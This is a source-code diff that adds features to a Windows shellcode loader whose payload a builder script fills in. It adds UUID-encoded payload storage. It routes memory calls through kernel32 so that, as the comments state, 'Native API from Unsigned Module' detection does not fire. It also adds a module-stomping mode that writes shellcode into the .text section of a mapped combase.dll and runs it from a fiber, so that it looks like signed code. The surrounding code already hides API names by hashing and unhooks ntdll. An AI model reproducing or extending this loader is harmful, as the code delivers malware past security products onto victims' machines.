@@ -111,6 +111,12 @@ constexpr DWORD HF_MapViewOfFile            = _hA("MapViewOfFile");
 constexpr DWORD HF_UnmapViewOfFile          = _hA("UnmapViewOfFile");
 constexpr DWORD HF_CloseHandle              = _hA("CloseHandle");
 constexpr DWORD HF_VirtualProtect           = _hA("VirtualProtect");
+constexpr DWORD HF_VirtualAlloc             = _hA("VirtualAlloc");
+constexpr DWORD HF_VirtualFree              = _hA("VirtualFree");
+#ifdef USE_MODULE_STOMP
+constexpr DWORD HF_NtCreateSection          = _hA("NtCreateSection");
+constexpr DWORD HF_NtMapViewOfSection       = _hA("NtMapViewOfSection");
+#endif
 constexpr DWORD HF_CreateProcessW           = _hA("CreateProcessW");
 constexpr DWORD HF_ResumeThread             = _hA("ResumeThread");
 constexpr DWORD HF_LoadLibraryA             = _hA("LoadLibraryA");
@@ -131,7 +137,7 @@ constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
 #ifdef USE_SELF_INJECT
 constexpr DWORD HF_NtWaitForSingleObject    = _hA("NtWaitForSingleObject");
 #endif
-#ifdef USE_FIBER_INJECT
+#if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
 constexpr DWORD HF_ConvertThreadToFiber     = _hA("ConvertThreadToFiber");
 constexpr DWORD HF_CreateFiber              = _hA("CreateFiber");
 constexpr DWORD HF_SwitchToFiber            = _hA("SwitchToFiber");
@@ -319,8 +325,22 @@ static void unhook_ntdll() {
 
 // ─── Payload (stamped by builder.py) ────────────────────────────────────────
 
-static unsigned char payload[] = { %PAYLOAD% };
-static const size_t  payload_size = sizeof(payload);
+#ifdef USE_UUID
+static const char *g_payload_uuids[] = { %PAYLOAD% };
+static const size_t g_uuid_count     = %UUID_COUNT%;
+static const size_t payload_size     = %PAYLOAD_SIZE%;
+
+static BYTE _hb(char c) {
+    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
+    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
+    return (BYTE)(c - 'A' + 10);
+}
+static void uuid_decode(const char *u, BYTE *out) {
+    static const int pos[] = {0,2,4,6, 9,11, 14,16, 19,21, 24,26,28,30,32,34};
+    for (int i = 0; i < 16; i++)
+        out[i] = (_hb(u[pos[i]]) << 4) | _hb(u[pos[i]+1]);
+}
+#else
 
 // ─── RC4 ─────────────────────────────────────────────────────────────────────
 
@@ -354,6 +374,11 @@ static void xor_crypt(unsigned char *buf, size_t len) {
     for (size_t i = 0; i < len; i++) buf[i] ^= key[i % klen];
 }
 #endif
+
+static unsigned char payload[] = { %PAYLOAD% };
+static const size_t  payload_size = sizeof(payload);
+
+#endif /* USE_UUID */
 
 // ─── Sandbox check ───────────────────────────────────────────────────────────
 
@@ -509,13 +534,29 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         DBG("[FAIL] Nt* API resolution failed"); return 1;
     }
 
-    /* Allocate local RW page for decrypted shellcode (NtAllocateVirtualMemory on self) */
+    /* Allocate local RW page for decoded/decrypted shellcode */
     unsigned char *sc = NULL;
     SIZE_T sc_sz = payload_size;
+#if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
+    /* Use Win32 VirtualAlloc: call goes through kernel32 (signed), avoids
+       "Native API from Unsigned Module" detection on NtAllocateVirtualMemory */
+    {
+        typedef LPVOID (WINAPI *t_VA)(LPVOID, SIZE_T, DWORD, DWORD);
+        t_VA pVA = (t_VA)RK32(HF_VirtualAlloc);
+        if (pVA) sc = (unsigned char *)pVA(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    }
+    if (!sc) { DBG("[FAIL] VirtualAlloc failed"); return 1; }
+#else
     NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }
+#endif
 
+#ifdef USE_UUID
+    for (size_t i = 0; i < g_uuid_count; i++)
+        uuid_decode(g_payload_uuids[i], sc + i * 16);
+    DBG_VAL("[5] UUID payload decoded, size", (unsigned long long)payload_size);
+#else
     memcpy(sc, payload, payload_size);
     memset(payload, 0, payload_size);
     DBG_VAL("[5] Payload copied, size", (unsigned long long)payload_size);
@@ -530,6 +571,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 #else
     DBG("[6] No decryption (plaintext)");
 #endif
+#endif /* USE_UUID */
 
 #ifdef USE_SELF_INJECT
     /* Self-injection via local APC: create suspended thread + queue APC */
@@ -600,18 +642,19 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         DBG_HEX("[FI1] SwitchToFiber resolved", (unsigned long long)(ULONG_PTR)pSTF);
         if (!pCTTF || !pCF || !pSTF) {
             DBG("[FAIL] FiberInject: API resolution failed");
-            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
             return 1;
         }
-        /* sc already decrypted and RW - change to RX */
+        /* sc already decrypted and RW - change to RX via VirtualProtect (kernel32, signed caller) */
         DBG_HEX("[FI2] shellcode addr", (unsigned long long)(ULONG_PTR)sc);
         DBG_VAL("[FI2] shellcode size", (unsigned long long)sc_sz);
-        PVOID  prot_base = sc;
-        SIZE_T prot_sz   = sc_sz;
-        ULONG  old_prot  = 0;
-        NTSTATUS stP = pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
-        DBG_HEX("[FI3] NtProtectVirtualMemory status", (unsigned long long)(ULONG)stP);
-        DBG("[FI3] Self RW -> RX done");
+        {
+            typedef BOOL (WINAPI *t_VP2)(LPVOID, SIZE_T, DWORD, PDWORD);
+            t_VP2 pVP2 = (t_VP2)RK32(HF_VirtualProtect);
+            DWORD old_fi = 0;
+            if (pVP2) pVP2((LPVOID)sc, payload_size, PAGE_EXECUTE_READ, &old_fi);
+        }
+        DBG("[FI3] Self RW -> RX via VirtualProtect done");
         LPVOID mainFiber = pCTTF(NULL);
         if (!mainFiber) {
             DBG("[FAIL] FiberInject: ConvertThreadToFiber failed (GetLastError may help)");
@@ -630,6 +673,136 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         DBG("[FI7] Returned from shellcode fiber (shellcode exited or switched back)");
         if (pDF) pDF(scFiber);
         DBG("[FI8] Fiber deleted - injection complete");
+    }
+#elif defined(USE_MODULE_STOMP)
+    /* Module stomping: map sacrificial DLL via NtCreateSection+NtMapViewOfSection,
+       write shellcode into its .text section, execute via fiber.
+       Shellcode runs from image-backed memory (signed DLL), all Nt* calls from
+       the shellcode appear to come from the signed DLL. */
+    {
+        DBG("[MS] === MODULE STOMPING + FIBER MODE ===");
+
+        typedef NTSTATUS (NTAPI *t_NtCS)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
+        typedef NTSTATUS (NTAPI *t_NtMVS)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
+        typedef LPVOID   (WINAPI *t_CTTF)(LPVOID);
+        typedef LPVOID   (WINAPI *t_CF)  (SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
+        typedef void     (WINAPI *t_STF) (LPVOID);
+        typedef BOOL     (WINAPI *t_VP2) (LPVOID, SIZE_T, DWORD, PDWORD);
+        typedef BOOL     (WINAPI *t_CH)  (HANDLE);
+
+        t_NtCS  pNtCS  = (t_NtCS)  resolve(hNtdll, HF_NtCreateSection);
+        t_NtMVS pNtMVS = (t_NtMVS) resolve(hNtdll, HF_NtMapViewOfSection);
+        t_CTTF  pCTTF  = (t_CTTF)  RK32(HF_ConvertThreadToFiber);
+        t_CF    pCF    = (t_CF)    RK32(HF_CreateFiber);
+        t_STF   pSTF   = (t_STF)   RK32(HF_SwitchToFiber);
+        t_VP2   pVP2   = (t_VP2)   RK32(HF_VirtualProtect);
+        t_CH    pCH    = (t_CH)    RK32(HF_CloseHandle);
+
+        if (!pNtCS || !pNtMVS || !pCTTF || !pCF || !pSTF || !pVP2) {
+            DBG("[FAIL] ModuleStomp: API resolution failed");
+            { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
+            return 1;
+        }
+
+        /* Sacrificial DLL path on stack (no string literal in binary) */
+        const char dll_path[] = {
+            'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\',
+            'c','o','m','b','a','s','e','.','d','l','l','\0'
+        };
+
+        /* Open DLL file */
+        typedef HANDLE (WINAPI *t_CFA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
+        t_CFA pCFA2 = (t_CFA)R(HMOD_KERNEL32, HF_CreateFileA);
+        if (!pCFA2) { DBG("[FAIL] ModuleStomp: CreateFileA not found"); return 1; }
+
+        HANDLE hFile = pCFA2(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) { DBG("[FAIL] ModuleStomp: CreateFileA failed"); return 1; }
+        DBG("[MS1] DLL file opened");
+
+        /* Create image section (SEC_IMAGE = 0x1000000) */
+        HANDLE hSection = NULL;
+        NTSTATUS stCS = pNtCS(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, 0x1000000, hFile);
+        if (pCH) pCH(hFile);
+        if (!NT_SUCCESS(stCS) || !hSection) {
+            DBG_HEX("[FAIL] ModuleStomp: NtCreateSection failed", (unsigned long long)(ULONG)stCS);
+            return 1;
+        }
+        DBG("[MS2] Image section created");
+
+        /* Map view into current process as RWX */
+        PVOID pDll = NULL;
+        SIZE_T viewSz = 0;
+        NTSTATUS stMVS = pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1 /*ViewShare*/, 0, PAGE_EXECUTE_WRITECOPY);
+        if (pCH) pCH(hSection);
+        if (!NT_SUCCESS(stMVS) || !pDll) {
+            /* Retry with PAGE_EXECUTE_READWRITE if WRITECOPY not supported */
+            pDll = NULL; viewSz = 0;
+            pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, PAGE_READWRITE);
+        }
+        if (!pDll) { DBG("[FAIL] ModuleStomp: NtMapViewOfSection failed"); return 1; }
+        DBG_HEX("[MS3] DLL mapped at", (unsigned long long)(ULONG_PTR)pDll);
+        DBG_VAL("[MS3] view size", (unsigned long long)viewSz);
+
+        /* Find the .text section entry point in the mapped DLL */
+        BYTE *base = (BYTE *)pDll;
+        IMAGE_NT_HEADERS *nt_hdr = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
+        ULONG_PTR entryPt = (ULONG_PTR)base + nt_hdr->OptionalHeader.AddressOfEntryPoint;
+        DBG_HEX("[MS4] DLL entry point", (unsigned long long)entryPt);
+
+        /* Find .text section to verify size */
+        IMAGE_SECTION_HEADER *sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);
+        SIZE_T text_sz = 0;
+        ULONG_PTR text_va = 0;
+        for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++, sec_hdr++) {
+            if (memcmp(sec_hdr->Name, ".text", 5) == 0) {
+                text_va = (ULONG_PTR)base + sec_hdr->VirtualAddress;
+                text_sz = sec_hdr->Misc.VirtualSize;
+                break;
+            }
+        }
+        DBG_VAL("[MS5] .text size", (unsigned long long)text_sz);
+        DBG_VAL("[MS5] payload size", (unsigned long long)payload_size);
+
+        /* If payload fits in .text starting from entry point, use entry point.
+           Otherwise use beginning of .text section. */
+        ULONG_PTR inject_addr = entryPt;
+        if (text_va && text_sz > payload_size) {
+            SIZE_T space_from_ep = text_sz - (entryPt - text_va);
+            if (space_from_ep < payload_size) {
+                inject_addr = text_va;
+                DBG("[MS5] Using .text base (entry point too close to end)");
+            }
+        } else if (text_va && text_sz > payload_size) {
+            inject_addr = text_va;
+        }
+        DBG_HEX("[MS6] Injection address", (unsigned long long)inject_addr);
+
+        /* RW the target region */
+        DWORD old_ms = 0;
+        pVP2((LPVOID)inject_addr, payload_size, PAGE_READWRITE, &old_ms);
+
+        /* Write shellcode into DLL memory */
+        memcpy((void *)inject_addr, sc, payload_size);
+        DBG("[MS7] Shellcode written to DLL .text");
+
+#ifdef USE_WIPE
+        memset(sc, 0, payload_size);
+#endif
+        /* Free local decryption buffer via VirtualFree */
+        { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
+
+        /* Restore RX */
+        pVP2((LPVOID)inject_addr, payload_size, PAGE_EXECUTE_READ, &old_ms);
+        DBG("[MS8] .text section RX restored");
+
+        /* Execute via fiber: shellcode runs from DLL image-backed memory */
+        LPVOID mainFiber = pCTTF(NULL);
+        if (!mainFiber) { DBG("[FAIL] ModuleStomp: ConvertThreadToFiber failed"); return 1; }
+        LPVOID scFiber = pCF(0x100000, (LPFIBER_START_ROUTINE)inject_addr, NULL);
+        if (!scFiber) { DBG("[FAIL] ModuleStomp: CreateFiber failed"); return 1; }
+        DBG("[MS9] Switching to shellcode fiber in DLL memory...");
+        pSTF(scFiber);
+        DBG("[MS10] Returned from shellcode fiber");
     }
 #elif defined(USE_REMOTE_THREAD)
     /* Inject into existing process via NtCreateThreadEx */
